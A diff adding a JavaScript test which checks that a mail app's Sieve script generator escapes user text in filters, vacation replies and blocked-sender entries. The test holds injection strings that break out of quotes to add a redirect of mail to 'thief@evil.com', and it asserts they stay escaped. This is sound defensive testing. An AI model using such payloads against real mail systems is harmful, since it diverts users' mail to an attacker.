@@ -119,3 +119,15 @@ test('filters on an attachment’s file name (any part, contains or not); the mi
     fs.rmSync(dir, { recursive: true, force: true });
   }
 });
+
+test('text from a filter, a vacation reply or a blocked sender can’t add Sieve commands (it stays inside its quotes)', async () => {
+  const { normalizeRules, userSieve } = await import('../src/mail/sieve.js');
+  const evil = 'x" { redirect "thief@evil.com"; } if true { keep; "';
+  const rules = normalizeRules([{ conditions: [{ field: 'subject', op: 'contains', value: evil }], actions: { moveTo: 'Work' } }]);
+  const script = userSieve({ username: 'kim@acme.com', rules, vacation: { subject: evil, body: `${evil}\nsecond line`, name: evil, username: 'kim@acme.com', addresses: ['kim@acme.com'] }, blocked: ['spam" ; redirect "thief@evil.com'] });
+  // Outside quoted strings there's no redirect at all: every one of them is in its string, escaped.
+  const outside = script.replace(/"(?:\\.|[^"\\])*"/g, '""');
+  assert.doesNotMatch(outside, /redirect/);
+  assert.doesNotMatch(outside, /thief/);
+  assert.match(script, /x\\" \{ redirect \\"thief@evil\.com\\"; \}/, 'kept as text, escaped');
+});
